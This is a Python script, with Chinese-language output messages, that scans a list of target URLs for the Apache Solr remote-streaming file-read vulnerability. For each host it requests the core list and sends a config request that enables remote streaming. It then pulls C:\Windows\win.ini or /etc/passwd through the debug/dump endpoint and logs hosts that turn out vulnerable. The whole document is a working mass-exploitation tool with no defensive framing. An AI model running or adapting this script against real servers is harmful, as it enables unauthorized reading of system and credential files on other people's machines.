import requests
import json

requests.packages.urllib3.disable_warnings()

headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

headers1 = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
	"Content-type": "application/json"
}

headers2 = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
	"Content-Type": "application/x-www-form-urlencoded"
}

data = "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
data1 = "stream.url=file:///C:\\Windows\\win.ini"
data2 = "stream.url=file:///etc/passwd"
for url in open("Apache Solr.txt"):
	url = url.replace("\n", "")
	print(url+"正在检测中------")
	try:
		jiaoyan = requests.get(url+"/solr/admin/cores?indexInfo=false&wt=json", headers=headers, verify=False, timeout=3)
		core_name = str(list(json.loads(jiaoyan.text)['status'])[0])
		print("获取到的core名称为:"+str(core_name))
		fileread = requests.get(url+"/solr/"+core_name+"/config", data=data, headers=headers1, verify=False, timeout=3)
		windows_fileread = requests.get(url+"/solr/"+core_name+"/debug/dump?param=ContentStreams", data=data1, headers=headers2, verify=False, timeout=3)
		linux_fileread = requests.get(url+"/solr/"+core_name+"/debug/dump?param=ContentStreams", data=data2, headers=headers2, verify=False, timeout=3)
		if ("[fonts]" in windows_fileread.text):
			print(url+"存在漏洞Apache Solr SSRF 文件读取------")
			with open("Apache Solr SSRF 文件读取 vul.txt", "a+") as f:
				f.write(url+"\n======\nsystem: Windows\ncore: "+core_name+"\n======\n\n")
		elif ("root:x:" in linux_fileread.text):
			with open("Apache Solr SSRF 文件读取 vul.txt", "a+") as f:
				print(url+"存在漏洞Apache Solr SSRF 文件读取------")
				f.write(url+"\n======\nsystem: Linux\ncore: "+core_name+"\n======\n\n")
	except:
		continue
